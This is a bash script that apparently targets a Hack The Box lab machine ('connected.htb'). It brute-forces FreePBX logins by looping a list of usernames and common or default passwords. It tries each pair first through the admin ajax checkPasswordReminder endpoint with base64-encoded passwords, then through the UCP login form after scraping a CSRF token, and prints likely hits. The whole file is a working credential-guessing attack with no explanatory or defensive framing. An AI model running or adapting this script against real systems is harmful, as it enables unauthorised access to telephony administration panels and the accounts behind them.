#!/bin/bash
IP=10.129.45.151
H='Host: connected.htb'
REF='Referer: http://connected.htb/admin/'
users=(admin root freepbx administrator qf0cl1r2o9sd79s2bn7habsu4r h0kesimg5368cii56h2i7ll8qn)
passes=(admin password freepbx FreePBX sangoma Password1 123456 admin123 p@ssw0rd changeme qf0cl1r2o9sd79s2bn7habsu4r h0kesimg5368cii56h2i7ll8qn)

echo "=== Admin ajax checkPasswordReminder ==="
for u in "${users[@]}"; do
  for p in "${passes[@]}"; do
    b64=$(echo -n "$p" | base64 -w0)
    r=$(curl -s -H "$H" -H "$REF" -X POST "http://$IP/admin/ajax.php?module=userman&command=checkPasswordReminder" \
      --data-urlencode "username=$u" --data-urlencode "password=$b64" -d 'loginpanel=admin')
    if ! echo "$r" | grep -q 'loginfailed":true'; then
      echo "HIT admin: $u / $p -> $r"
    fi
  done
done

echo "=== UCP POST login ==="
html=$(curl -s -H "$H" "http://$IP/ucp/")
token=$(echo "$html" | grep -oP 'name="token" value="\K[^"]+')
for u in "${users[@]}"; do
  for p in "${passes[@]}"; do
    r=$(curl -s -L -H "$H" -X POST "http://$IP/ucp/?display=dashboard" \
      -d "token=$token&username=$u&password=$p&rememberme=on")
    if echo "$r" | grep -qiE 'dashboard|logout|welcome|invalid'; then
      if ! echo "$r" | grep -qi 'invalid\|error\|failed\|incorrect'; then
        echo "POSSIBLE UCP: $u / $p (check response length $(echo -n "$r" | wc -c))"
      fi
    fi
    # refresh token occasionally
    token=$(curl -s -H "$H" "http://$IP/ucp/" | grep -oP 'name="token" value="\K[^"]+')
  done
done
echo "=== done ==="